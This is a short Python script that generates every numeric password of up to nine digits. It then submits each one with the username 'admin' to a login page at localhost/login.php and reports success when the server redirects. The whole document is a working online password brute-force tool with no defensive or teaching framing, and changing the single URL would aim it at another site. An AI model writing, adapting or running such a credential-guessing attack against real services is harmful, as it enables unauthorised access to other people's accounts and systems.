import itertools
import urllib.request
import urllib.parse
import time
import os
n = 9 #maximum password lenght
nums = '1234567890' #dictionary
file_path = "password.txt" #file for storing passwords
with open(file_path, 'w') as f: #writing passwords to a file
    while n != 0:
        for i in itertools.product(nums,repeat=n):
            f.write("".join(i) + '\n')
        n -= 1
clock = time.time()
try:
    with open(file_path, 'r') as f:
        print("Brute force......")
        for password in f:
            password = password[0:-1]
            data = [("login", "admin"), ("pass", password), ] #("login", "admin") is equivalent to GET reguest login=admin and so on
            enc_data = urllib.parse.urlencode(data)
            f = urllib.request.urlopen("http://localhost/login.php" + "?" + enc_data) #URL
            check = f.geturl()
            print(password)
            if (check != "http://localhost/login.php" + "?" + enc_data): #check
                print(str((f.read()), 'utf-8'))
                print('Your password is ' + password)
                print('Brute force ', time.time()-clock, 'seconds')
                os.remove('password.txt')
                break
    if not password:
        raise Exception("File is empty")
except IOError as e:
    password = []
except Exception as e:
    password = []
    print(e)
